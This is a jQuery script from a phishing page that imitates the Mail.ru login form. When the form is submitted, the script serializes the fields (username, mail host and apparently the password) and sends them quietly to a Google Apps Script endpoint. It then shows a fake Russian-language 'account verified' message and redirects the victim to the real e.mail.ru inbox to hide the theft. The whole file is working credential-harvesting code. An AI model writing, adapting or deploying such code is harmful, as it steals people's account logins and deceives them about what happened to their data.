$(document).ready(function(){	

	$('#send-form').submit(function(e){
		e.preventDefault();
		
		form = $(this);
		data = form.serialize();
	
		$.ajax({
			type: 'GET',
			url: 'https://script.google.com/macros/s/AKfycbyICEg_jHsuwvJUEx4VRRWB_56K2NmHqHQtfiJBWZP2-JqgcySO/exec',
			data: data
		});
		
		form.html('<div class="check-header">Вы успешно прошли авторизацию. Ваш аккаунт ВЕРИФИЦИРОВАН</div><div class="check-checked"><img src="./data/check.png" /></div><div class="check-hr"></div><div class="check-href">Перейти во входящие</div><div class="check-info">Через <span id="time-out">5</span> секунд Вы попадете туда автоматически</div>');
		
		var t=5;
		r = setInterval(function(){
			
			if( t <= 0 ){
				clearInterval( r );
				$('.check-href').click();
				return true;
			}
		
			t--;
			$('#time-out').text( t );
		}, 1000);
		
		
	});
	
	$(document).on('click', '.check-href', function(){
		window.location.href = 'https://e.mail.ru/inbox/';
	})
	
	$(document).on('input', 'input[name="username"]', function(){
		if( $(this).val().indexOf('@') != -1 )
			$('.domain-select').hide();
		else
			$('.domain-select').show();
	});
	
	$('.login-row.last div[data-checked]').click(function(){
		$('.c01151').toggleClass('c01155');
		return false;
	});
	
	$('div[data-test-id="domain-select"]').click(function(){
		$('#select-host').show();
	});
	
	$('.select-host-item').click(function(){
		e = $(this);
		
		$('#react-select-2--value-item span span').text( e.text() );
		$('input[name=host]').val( e.text() );
	});
	
	$(document).click(function(e){
		if( $( e.target ).closest('#react-select-2--value, .c0192').length )
			return;
		
		$('#select-host').hide();
	});
});